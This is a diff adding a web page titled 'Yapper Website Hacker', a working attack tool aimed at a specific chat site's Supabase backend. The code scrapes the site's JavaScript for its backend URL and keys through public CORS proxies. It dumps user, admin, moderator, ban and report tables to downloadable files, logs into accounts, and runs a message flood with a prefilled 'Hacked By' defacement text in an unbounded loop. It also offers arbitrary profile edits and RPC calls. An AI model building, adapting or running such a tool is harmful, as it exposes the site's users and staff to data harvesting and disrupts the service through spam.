@@ -1,0 +1,603 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Yapper Website Hacker</title>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
+<style>
+  :root{color-scheme:dark}*{box-sizing:border-box}
+  body{margin:0;padding:22px 14px 70px;background:#0d0f13;color:#e6e8ec;
+       font:14px/1.5 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+  main{max-width:1000px;margin:0 auto;display:grid;gap:12px}
+  h1{margin:0;font-size:23px}h2{margin:0 0 4px;font-size:13px;letter-spacing:.05em;
+    text-transform:uppercase;color:#8b93a1}
+  .sub{color:#8b93a1;margin:0}
+  .tabs{display:flex;gap:6px;flex-wrap:wrap}
+  .tabs button{border:1px solid #252a34;background:#15181e;color:#aab2c0;border-radius:8px;
+    padding:7px 12px;cursor:pointer;font:inherit}
+  .tabs button.on{background:#5865f2;border-color:#5865f2;color:#fff;font-weight:600}
+  .card{background:#15181e;border:1px solid #252a34;border-radius:12px;padding:14px;display:grid;gap:9px}
+  .pane{display:none;gap:12px;grid-auto-rows:min-content}
+  .pane.on{display:grid}
+  label{font-size:12px;color:#98a1b0;font-weight:600}
+  .row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+  input,select,textarea{width:100%;background:#0a0c10;color:#e6e8ec;border:1px solid #262b35;
+    border-radius:8px;padding:9px;font:inherit}
+  textarea{resize:vertical}
+  input[type=checkbox]{width:auto}
+  button{border:1px solid #262b35;background:#1e222a;color:#e6e8ec;border-radius:8px;
+    padding:9px 12px;font:inherit;cursor:pointer;white-space:nowrap}
+  button:hover:not(:disabled){background:#262b35}button:disabled{opacity:.45;cursor:default}
+  button.p{background:#5865f2;border-color:#5865f2;font-weight:600}
+  button.d{background:#c0392b;border-color:#c0392b;font-weight:600}
+  button.g{background:transparent}.sm{padding:5px 9px;font-size:12px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:9px;align-items:end}
+  .pill{font-size:11px;padding:3px 9px;border-radius:999px;border:1px solid #262b35;color:#7ee2a8}
+  .pill.bad{color:#ff8a8a}.pill.warn{color:#ffcc66}
+  .log{background:#080a0d;border:1px solid #1e222a;border-radius:8px;padding:8px;height:190px;
+    overflow:auto;font:12px/1.45 ui-monospace,Menlo,monospace}
+  .log div{white-space:pre-wrap;word-break:break-word}
+  .ok{color:#7ee2a8}.err{color:#ff8a8a}.warn{color:#ffcc66}.info{color:#8fb8ff}.dim{color:#5f6875}
+  .tblwrap{overflow:auto;max-height:420px;border:1px solid #1e222a;border-radius:8px}
+  table{border-collapse:collapse;font-size:12px;width:100%}
+  th,td{border-bottom:1px solid #1e222a;padding:5px 8px;text-align:left;vertical-align:top;
+    max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  th{background:#12151a;position:sticky;top:0;color:#9aa3b2}
+  .hint{font-size:11px;color:#6f7787}
+  code{color:#7ee2a8;font-size:12px}
+  .kv{font:12px ui-monospace,Menlo,monospace;color:#c9d1dc}
+</style>
+</head>
+<body>
+<main>
+  <div class="row" style="justify-content:space-between">
+    <div>
+      <h1>Yapper Website Hacker</h1>
+      <p class="sub">Talks straight to the site's own Supabase. No bot. No BOT tag.</p>
+    </div>
+    <span class="pill warn" id="stat">keys missing</span>
+  </div>
+
+  <div class="tabs">
+    <button class="on" data-tab="keys">1 · Keys</button>
+    <button data-tab="spy">2 · Spy (read)</button>
+    <button data-tab="login">3 · Login (write)</button>
+    <button data-tab="act">4 · Act</button>
+    <button data-tab="rpc">5 · RPC</button>
+  </div>
+
+  <!-- KEYS -->
+  <section class="pane on" id="pane-keys">
+    <div class="card">
+      <h2>Auto-discover</h2>
+      <p class="hint">Yapper ships its Supabase URL + public key to every browser. This reads them out of the site's own JS.</p>
+      <div class="row">
+        <button class="p" onclick="discover()">Find the keys</button>
+        <span class="hint" id="dprogress"></span>
+      </div>
+    </div>
+    <div class="card">
+      <h2>Keys</h2>
+      <div class="grid">
+        <div style="grid-column:1/-1"><label>Supabase URL</label><input id="url" placeholder="https://xxxxxxxx.supabase.co"></div>
+        <div style="grid-column:1/-1"><label>Public (anon) key</label><input id="key" placeholder="eyJ... or sb_publishable_..."></div>
+        <div><label>Turnstile site key (captcha)</label><input id="ts" placeholder="0x4AAAAA..."></div>
+      </div>
+      <div class="row">
+        <button class="p" onclick="saveKeys()">Save</button>
+        <button onclick="testKeys()">Test</button>
+        <button class="g" onclick="clearKeys()">Clear</button>
+      </div>
+      <div class="hint" id="keytest"></div>
+    </div>
+  </section>
+
+  <!-- SPY -->
+  <section class="pane" id="pane-spy">
+    <div class="card">
+      <h2>Quick presets</h2>
+      <div class="row">
+        <button onclick="preset('users')">All users</button>
+        <button onclick="preset('mods')">Mods &amp; admins</button>
+        <button onclick="preset('servers')">All servers</button>
+        <button onclick="preset('bans')">Site bans</button>
+        <button onclick="preset('reports')">Reports</button>
+        <button onclick="preset('warnings')">Warnings</button>
+        <button onclick="preset('emojis')">Emojis</button>
+      </div>
+    </div>
+    <div class="card">
+      <h2>Query</h2>
+      <div class="grid">
+        <div><label>Table</label><input id="q_table" list="tables" value="profiles"></div>
+        <div><label>Select</label><input id="q_select" value="*"></div>
+        <div><label>Filter col</label><input id="q_col" placeholder="username"></div>
+        <div><label>Op</label><select id="q_op">
+          <option>eq</option><option>neq</option><option>like</option><option>ilike</option>
+          <option>gt</option><option>lt</option><option>gte</option><option>lte</option><option>in</option>
+        </select></div>
+        <div><label>Value</label><input id="q_val"></div>
+        <div><label>Order</label><input id="q_order" placeholder="created_at.desc"></div>
+        <div><label>Limit</label><input id="q_limit" type="number" value="50"></div>
+      </div>
+      <datalist id="tables">
+        <option>profiles</option><option>servers</option><option>channels</option><option>messages</option>
+        <option>reactions</option><option>emojis</option><option>site_admins</option><option>site_moderators</option>
+        <option>site_bans</option><option>user_warnings</option><option>reports</option><option>mod_log</option>
+        <option>mod_notes</option><option>friendships</option><option>blocks</option><option>server_members</option>
+        <option>channel_members</option><option>roles</option><option>polls</option>
+      </datalist>
+      <div class="row">
+        <button class="p" onclick="runQuery()">Run</button>
+        <button onclick="downloadJSON()">Download JSON</button>
+        <button onclick="downloadCSV()">Download CSV</button>
+        <span class="hint" id="qcount"></span>
+      </div>
+    </div>
+    <div class="card"><div class="tblwrap"><table id="qout"><tbody></tbody></table></div></div>
+  </section>
+
+  <!-- LOGIN -->
+  <section class="pane" id="pane-login">
+    <div class="card">
+      <h2>Log in as a real account</h2>
+      <p class="hint">Reads work with just the public key. Writing (posting as a human, editing profiles) needs a real session.</p>
+      <div class="grid">
+        <div><label>Email</label><input id="l_email" type="email"></div>
+        <div><label>Password</label><input id="l_pass" type="password"></div>
+        <div><button class="p" onclick="login()">Log in</button></div>
+      </div>
+      <div class="hint">Captcha widget appears below if the project has Turnstile on.</div>
+      <div id="tsbox" class="row" style="min-height:66px"></div>
+      <div class="kv" id="session">not logged in</div>
+      <div class="row">
+        <button onclick="whoami()">Who am I</button>
+        <button onclick="refresh()">Refresh session</button>
+        <button class="d" onclick="logout()">Log out</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ACT -->
+  <section class="pane" id="pane-act">
+    <div class="card">
+      <h2>Post a message (as you, not a bot)</h2>
+      <div class="grid">
+        <div><label>Channel id</label><input id="a_channel"></div>
+        <div style="grid-column:1/-1"><label>Text</label><textarea id="a_text" rows="2">Hacked By The Big DataDiscord</textarea></div>
+        <div><label>Interval ms (flood)</label><input id="a_gap" type="number" value="700"></div>
+        <div><label>Max (0 = forever)</label><input id="a_max" type="number" value="0"></div>
+      </div>
+      <div class="row">
+        <button class="p" onclick="postOnce()">Post once</button>
+        <button class="p" onclick="startFlood()">▶ Flood</button>
+        <button class="d" onclick="stopFlood()">■ Stop</button>
+        <span class="hint" id="a_count">sent: 0</span>
+      </div>
+    </div>
+    <div class="card">
+      <h2>Other writes</h2>
+      <div class="grid">
+        <div><label>React: message id</label><input id="a_msg"></div>
+        <div><label>Emoji</label><input id="a_emoji" value="🔥"></div>
+        <div><label>Join server id</label><input id="a_server"></div>
+      </div>
+      <div class="row">
+        <button onclick="react()">React</button>
+        <button onclick="joinServer()">Join server</button>
+        <button onclick="loadMyChannels()">My channels</button>
+      </div>
+    </div>
+    <div class="card">
+      <h2>My profile</h2>
+      <div class="grid">
+        <div><label>display_name</label><input id="p_dn"></div>
+        <div><label>custom_status</label><input id="p_cs"></div>
+        <div><label>accent_color</label><input id="p_ac" value="#ff4fd8"></div>
+      </div>
+      <div><label>bio</label><textarea id="p_bio" rows="2"></textarea></div>
+      <div class="row"><button class="p" onclick="saveProfile()">Save profile</button></div>
+    </div>
+  </section>
+
+  <!-- RPC -->
+  <section class="pane" id="pane-rpc">
+    <div class="card">
+      <h2>Call any database function</h2>
+      <div class="grid">
+        <div><label>Function</label><input id="r_fn" list="fns" placeholder="who_online"></div>
+        <div style="grid-column:1/-1"><label>Args (JSON)</label><input id="r_args" value="{}"></div>
+      </div>
+      <datalist id="fns">
+        <option>who_online</option><option>username_taken</option><option>bootstrap</option>
+        <option>open_reports_count</option><option>my_standing</option><option>heartbeat</option>
+        <option>bot_directory</option><option>unread_counts_v2</option><option>get_or_create_dm</option>
+      </datalist>
+      <div class="row"><button class="p" onclick="callRpc()">Call</button></div>
+    </div>
+  </section>
+
+  <div class="card">
+    <div class="row" style="justify-content:space-between">
+      <h2>Log</h2>
+      <div class="row"><button class="g sm" onclick="document.getElementById('log').innerHTML=''">clear</button></div>
+    </div>
+    <div class="log" id="log"></div>
+  </div>
+</main>
+
+<script>
+/* ============ state ============ */
+const SB = {
+  url: localStorage.getItem('sb_url') || '',
+  key: localStorage.getItem('sb_key') || '',
+  ts: localStorage.getItem('sb_ts') || '',
+};
+let session = JSON.parse(localStorage.getItem('sb_session') || 'null');
+let me = null, flooding = false, sent = 0, captcha = '', tsWidget = null, lastRows = [];
+
+const $ = (id) => document.getElementById(id);
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+const logEl = $('log');
+function log(t, c = '') {
+  const d = document.createElement('div');
+  d.className = c;
+  d.textContent = new Date().toLocaleTimeString() + '  ' + t;
+  logEl.appendChild(d);
+  while (logEl.childElementCount > 400) logEl.removeChild(logEl.firstChild);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function status(t, cls = '') { const s = $('stat'); s.textContent = t; s.className = 'pill ' + cls; }
+
+document.querySelectorAll('.tabs button').forEach((b) => {
+  b.onclick = () => {
+    document.querySelectorAll('.tabs button').forEach((x) => x.classList.remove('on'));
+    document.querySelectorAll('.pane').forEach((x) => x.classList.remove('on'));
+    b.classList.add('on');
+    $('pane-' + b.dataset.tab).classList.add('on');
+  };
+});
+
+/* ============ discovery ============ */
+const SITE = 'https://www.yapper.website';
+const FALLBACK_CHUNKS = [
+  '/_next/static/immutable/chunks/0tro-aqdtf9cj.js',
+  '/_next/static/immutable/chunks/0m0yze-hi42ud.js',
+  '/_next/static/immutable/chunks/134ggyt23-zx4.js',
+  '/_next/static/immutable/chunks/31rqkbibmcrsj.js',
+  '/_next/static/immutable/chunks/327k16lz704lg.js',
+  '/_next/static/immutable/chunks/3kvly-y_qkchd.js',
+  '/_next/static/immutable/chunks/3gg-4nlzh36o6.js',
+  '/_next/static/immutable/chunks/2-xm-bdln8jbz.js',
+  '/_next/static/immutable/chunks/1a31avh4lke48.js',
+  '/_next/static/immutable/chunks/1l5dldfpqumr0.js',
+];
+const PROXIES = [
+  (u) => u,
+  (u) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u),
+  (u) => 'https://corsproxy.io/?' + encodeURIComponent(u),
+];
+async function getText(u) {
+  for (const p of PROXIES) {
+    try {
+      const r = await fetch(p(u), { cache: 'no-store' });
+      if (r.ok) return await r.text();
+    } catch {}
+  }
+  return null;
+}
+function jwtRole(tok) {
+  try {
+    const p = JSON.parse(atob(tok.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));
+    return p.role || null;
+  } catch { return null; }
+}
+async function discover() {
+  status('discovering…', 'warn');
+  log('fetching yapper.website…', 'info');
+  const html = await getText(SITE + '/');
+  let chunks = FALLBACK_CHUNKS.slice();
+  if (html) {
+    const found = [...new Set((html.match(/\/_next\/static\/[^"'\s\\)]+\.js/g) || []))];
+    if (found.length) chunks = found.slice(0, 40);
+    log(`found ${chunks.length} script(s) on the page`, 'info');
+  } else {
+    log('page blocked cross-origin — using known chunk list', 'warn');
+  }
+
+  let url = '', key = '', ts = '';
+  for (let i = 0; i < chunks.length; i++) {
+    $('dprogress').textContent = `${i + 1}/${chunks.length}`;
+    const js = await getText(SITE + chunks[i]);
+    if (!js) continue;
+
+    if (!url) {
+      const m = js.match(/https:\/\/([a-z0-9]{12,})\.supabase\.co/) ||
+                js.match(/https:\/\/[a-z0-9.-]*supabase[a-z0-9.-]*/i);
+      if (m) url = m[0];
+    }
+    if (!key) {
+      const pub = js.match(/sb_publishable_[A-Za-z0-9_-]{10,}/);
+      if (pub) key = pub[0];
+      else {
+        for (const t of js.match(/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}/g) || []) {
+          if (jwtRole(t) === 'anon') { key = t; break; }
+        }
+      }
+    }
+    if (!ts) {
+      const m = js.match(/0x4AAAAA[A-Za-z0-9_-]{10,}/);
+      if (m) ts = m[0];
+    }
+    if (url && key && ts) break;
+  }
+
+  if (url) $('url').value = url;
+  if (key) $('key').value = key;
+  if (ts) $('ts').value = ts;
+  log(url ? `URL: ${url}` : 'URL not found — paste it manually', url ? 'ok' : 'warn');
+  log(key ? `key: ${key.slice(0, 28)}… (${key.length} chars)` : 'key not found — paste it manually', key ? 'ok' : 'warn');
+  if (ts) log(`turnstile site key: ${ts}`, 'ok');
+  if (url && key) saveKeys();
+}
+function saveKeys() {
+  SB.url = $('url').value.trim().replace(/\/$/, '');
+  SB.key = $('key').value.trim();
+  SB.ts = $('ts').value.trim();
+  localStorage.setItem('sb_url', SB.url);
+  localStorage.setItem('sb_key', SB.key);
+  localStorage.setItem('sb_ts', SB.ts);
+  status(SB.url ? 'connected' : 'keys missing', SB.url ? '' : 'warn');
+  log('keys saved', 'ok');
+  mountTurnstile();
+}
+function clearKeys() {
+  ['sb_url', 'sb_key', 'sb_ts'].forEach((k) => localStorage.removeItem(k));
+  SB.url = SB.key = SB.ts = '';
+  $('url').value = $('key').value = $('ts').value = '';
+  status('keys missing', 'warn');
+}
+async function testKeys() {
+  if (!SB.url || !SB.key) return ($('keytest').textContent = 'save keys first');
+  $('keytest').textContent = 'testing…';
+  try {
+    const r = await fetch(`${SB.url}/rest/v1/profiles?select=username&limit=1`, { headers: hdrs() });
+    const t = await r.text();
+    $('keytest').textContent = r.ok
+      ? 'OK — backend answered: ' + t.slice(0, 120)
+      : `HTTP ${r.status}: ${t.slice(0, 160)}`;
+    log('key test ' + r.status, r.ok ? 'ok' : 'err');
+  } catch (e) { $('keytest').textContent = 'failed: ' + e.message; }
+}
+
+/* ============ supabase plumbing ============ */
+function hdrs(extra = {}) {
+  return {
+    apikey: SB.key,
+    Authorization: 'Bearer ' + (session?.access_token || SB.key),
+    'Content-Type': 'application/json',
+    ...extra,
+  };
+}
+async function rest(path, { method = 'GET', body, prefer } = {}) {
+  if (!SB.url || !SB.key) throw new Error('no keys');
+  const r = await fetch(SB.url + '/rest/v1' + path, {
+    method,
+    headers: hdrs(prefer ? { Prefer: prefer } : {}),
+    body: body === undefined ? undefined : JSON.stringify(body),
+  });
+  const text = await r.text();
+  let data = null;
+  try { data = text ? JSON.parse(text) : null; } catch { data = text; }
+  if (!r.ok) {
+    const e = new Error(data?.message || data?.error || `HTTP ${r.status}`);
+    e.status = r.status; e.data = data; throw e;
+  }
+  return { data, range: r.headers.get('content-range') };
+}
+
+/* ============ login ============ */
+function mountTurnstile() {
+  if (!SB.ts || !window.turnstile) return;
+  const box = $('tsbox');
+  box.innerHTML = '<div id="tsw"></div>';
+  try {
+    tsWidget = turnstile.render('#tsw', {
+      sitekey: SB.ts,
+      callback: (t) => { captcha = t; log('captcha solved', 'ok'); },
+      'expired-callback': () => { captcha = ''; },
+    });
+  } catch {}
+}
+window.addEventListener('load', () => setTimeout(mountTurnstile, 400));
+
+async function login() {
+  const email = $('l_email').value.trim(), password = $('l_pass').value;
+  if (!email || !password) return log('email + password required', 'warn');
+  try {
+    const r = await fetch(`${SB.url}/auth/v1/token?grant_type=password`, {
+      method: 'POST',
+      headers: { apikey: SB.key, 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email, password,
+        gotrue_meta_security: captcha ? { captcha_token: captcha } : undefined,
+      }),
+    });
+    const data = await r.json();
+    if (!r.ok) throw new Error(data.error_description || data.msg || data.error || `HTTP ${r.status}`);
+    session = data;
+    localStorage.setItem('sb_session', JSON.stringify(data));
+    log('logged in as ' + data.user?.email, 'ok');
+    await whoami();
+  } catch (e) { log('login failed: ' + e.message, 'err'); }
+}
+async function whoami() {
+  if (!session) return ($('session').textContent = 'not logged in');
+  try {
+    const r = await fetch(`${SB.url}/auth/v1/user`, { headers: hdrs() });
+    const u = await r.json();
+    if (!r.ok) throw new Error(u.msg || `HTTP ${r.status}`);
+    me = u;
+    $('session').textContent = `id ${u.id} · ${u.email} · @${u.user_metadata?.username || '?'}`;
+    log('session user: ' + u.id, 'ok');
+  } catch (e) { log('whoami: ' + e.message, 'err'); }
+}
+async function refresh() {
+  if (!session?.refresh_token) return log('nothing to refresh', 'warn');
+  try {
+    const r = await fetch(`${SB.url}/auth/v1/token?grant_type=refresh_token`, {
+      method: 'POST',
+      headers: { apikey: SB.key, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ refresh_token: session.refresh_token }),
+    });
+    const d = await r.json();
+    if (!r.ok) throw new Error(d.error_description || d.msg || `HTTP ${r.status}`);
+    session = d; localStorage.setItem('sb_session', JSON.stringify(d));
+    log('session refreshed', 'ok');
+  } catch (e) { log('refresh: ' + e.message, 'err'); }
+}
+function logout() { session = null; me = null; localStorage.removeItem('sb_session'); $('session').textContent = 'not logged in'; log('logged out', 'warn'); }
+
+/* ============ spy ============ */
+function buildUrl(t, sel, col, op, val, order, limit) {
+  let q = `?select=${encodeURIComponent(sel || '*')}`;
+  if (col && op && val !== '') {
+    const v = op === 'in' ? `(${val})` : op === 'like' || op === 'ilike' ? val : val;
+    q += `&${col}=${op}.${encodeURIComponent(v)}`;
+  }
+  if (order) q += `&order=${order}`;
+  q += `&limit=${limit || 50}`;
+  return `/` + t + q;
+}
+async function runQuery() {
+  const { data, range } = await rest(buildUrl(
+    $('q_table').value.trim(), $('q_select').value.trim(), $('q_col').value.trim(),
+    $('q_op').value, $('q_val').value.trim(), $('q_order').value.trim(), Number($('q_limit').value)
+  ), { prefer: 'count=exact' }).catch((e) => { log('query: ' + e.message, 'err'); return {}; });
+  if (!data) return;
+  render(data, range);
+}
+function render(rows, range) {
+  lastRows = Array.isArray(rows) ? rows : [rows];
+  const t = $('qout');
+  if (!lastRows.length) { t.innerHTML = '<tbody><tr><td class="dim">no rows</td></tr></tbody>'; $('qcount').textContent = '0 rows'; return; }
+  const cols = [...new Set(lastRows.flatMap((r) => Object.keys(r || {})))];
+  const head = '<thead><tr>' + cols.map((c) => `<th>${c}</th>`).join('') + '</tr></thead>';
+  const body = '<tbody>' + lastRows.map((r) => '<tr>' + cols.map((c) => {
+    const v = r?.[c];
+    return `<td title="${String(v ?? '').replace(/"/g, '&quot;')}">${v === null || v === undefined ? '<span class="dim">null</span>' : String(v).replace(/</g, '&lt;')}</td>`;
+  }).join('') + '</tr>').join('') + '</tbody>';
+  t.innerHTML = head + body;
+  $('qcount').textContent = `${lastRows.length} row(s)${range ? ' · total ' + range.split('/')[1] : ''}`;
+  log(`query ok: ${lastRows.length} row(s)`, 'ok');
+}
+async function preset(what) {
+  const set = (t, s, o, l) => { $('q_table').value = t; $('q_select').value = s; $('q_order').value = o || ''; $('q_limit').value = l || 50; $('q_col').value = ''; $('q_val').value = ''; };
+  if (what === 'users') { set('profiles', 'id,username,display_name,created_at,plus_until', 'created_at.desc', 100); return runQuery(); }
+  if (what === 'servers') { set('servers', '*', 'created_at.desc', 100); return runQuery(); }
+  if (what === 'bans') { set('site_bans', '*', 'created_at.desc', 100); return runQuery(); }
+  if (what === 'reports') { set('reports', '*', 'created_at.desc', 100); return runQuery(); }
+  if (what === 'warnings') { set('user_warnings', '*', 'created_at.desc', 100); return runQuery(); }
+  if (what === 'emojis') { set('emojis', '*', '', 100); return runQuery(); }
+  if (what === 'mods') {
+    try {
+      const ids = [];
+      for (const t of ['site_admins', 'site_moderators']) {
+        try { const { data } = await rest(`/${t}?select=user_id`); (data || []).forEach((r) => ids.push(r.user_id)); }
+        catch (e) { log(`${t}: ${e.message}`, 'warn'); }
+      }
+      const uniq = [...new Set(ids)];
+      if (!uniq.length) return log('no mods/admins readable with anon key', 'warn');
+      const { data, range } = await rest(`/profiles?select=id,username,display_name,badges,tag,created_at&id=in.(${uniq.join(',')})`, { prefer: 'count=exact' });
+      log(`staff ids found: ${uniq.length}`, 'info');
+      render(data, range);
+    } catch (e) { log('mods: ' + e.message, 'err'); }
+  }
+}
+function dl(name, text, type) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([text], { type }));
+  a.download = name; a.click(); URL.revokeObjectURL(a.href);
+}
+const downloadJSON = () => dl('yapper.json', JSON.stringify(lastRows, null, 2), 'application/json');
+function downloadCSV() {
+  if (!lastRows.length) return;
+  const cols = [...new Set(lastRows.flatMap((r) => Object.keys(r || {})))];
+  const esc = (v) => `"${String(v ?? '').replace(/"/g, '""')}"`;
+  dl('yapper.csv', [cols.join(','), ...lastRows.map((r) => cols.map((c) => esc(r?.[c])).join(','))].join('\n'), 'text/csv');
+}
+
+/* ============ act ============ */
+async function postOnce() {
+  if (!me) await whoami();
+  if (!me) return log('log in first', 'warn');
+  const ch = $('a_channel').value.trim(); if (!ch) return log('channel id required', 'warn');
+  await rest('/messages', { method: 'POST', body: { channel_id: ch, author_id: me.id, content: $('a_text').value }, prefer: 'return=representation' })
+    .then(() => { sent++; $('a_count').textContent = 'sent: ' + sent; })
+    .catch((e) => { log('post: ' + e.message + ' ' + JSON.stringify(e.data || {}), 'err'); throw e; });
+}
+async function startFlood() {
+  if (flooding) return;
+  flooding = true; sent = 0;
+  const gap = Number($('a_gap').value) || 700, max = Number($('a_max').value) || 0;
+  log('flood started', 'info');
+  while (flooding && (!max || sent < max)) {
+    try { await postOnce(); if (sent % 10 === 0) log('flood ' + sent, 'info'); }
+    catch { await sleep(1200); }
+    await sleep(gap);
+  }
+  log(`flood stopped (${sent})`, 'warn'); flooding = false;
+}
+const stopFlood = () => (flooding = false);
+async function react() {
+  if (!me) await whoami();
+  if (!me) return log('log in first', 'warn');
+  await rest('/reactions', { method: 'POST', body: { message_id: $('a_msg').value.trim(), user_id: me.id, emoji: $('a_emoji').value } })
+    .then(() => log('reacted', 'ok')).catch((e) => log('react: ' + e.message, 'err'));
+}
+async function joinServer() {
+  if (!me) await whoami();
+  if (!me) return log('log in first', 'warn');
+  await rest('/server_members', { method: 'POST', body: { server_id: $('a_server').value.trim(), user_id: me.id } })
+    .then(() => log('joined', 'ok')).catch((e) => log('join: ' + e.message, 'err'));
+}
+async function loadMyChannels() {
+  if (!me) await whoami();
+  if (!me) return log('log in first', 'warn');
+  const { data } = await rest(`/channel_members?select=channel_id&user_id=eq.${me.id}&limit=100`).catch(() => ({}));
+  log('my channels: ' + (data || []).map((c) => c.channel_id).join(', '), 'info');
+  render(data || []);
+}
+async function saveProfile() {
+  if (!me) await whoami();
+  if (!me) return log('log in first', 'warn');
+  const patch = {};
+  if ($('p_dn').value) patch.display_name = $('p_dn').value;
+  if ($('p_cs').value) patch.custom_status = $('p_cs').value;
+  if ($('p_ac').value) patch.accent_color = $('p_ac').value;
+  if ($('p_bio').value) patch.bio = $('p_bio').value;
+  await rest(`/profiles?id=eq.${me.id}`, { method: 'PATCH', body: patch })
+    .then(() => log('profile saved', 'ok')).catch((e) => log('profile: ' + e.message, 'err'));
+}
+
+/* ============ rpc ============ */
+async function callRpc() {
+  const fn = $('r_fn').value.trim();
+  let args = {};
+  try { args = JSON.parse($('r_args').value || '{}'); } catch { return log('args is not JSON', 'warn'); }
+  try {
+    const { data } = await rest(`/rpc/${fn}`, { method: 'POST', body: args });
+    log(`rpc ${fn} ok`, 'ok');
+    render(data);
+  } catch (e) { log(`rpc ${fn}: ${e.message}`, 'err'); }
+}
+
+/* ============ boot ============ */
+$('url').value = SB.url; $('key').value = SB.key; $('ts').value = SB.ts;
+status(SB.url && SB.key ? 'connected' : 'keys missing', SB.url && SB.key ? '' : 'warn');
+if (session) { log('restored session', 'info'); whoami(); }
+if (SB.url && SB.key) mountTurnstile();
+</script>
+</body>
+</html>
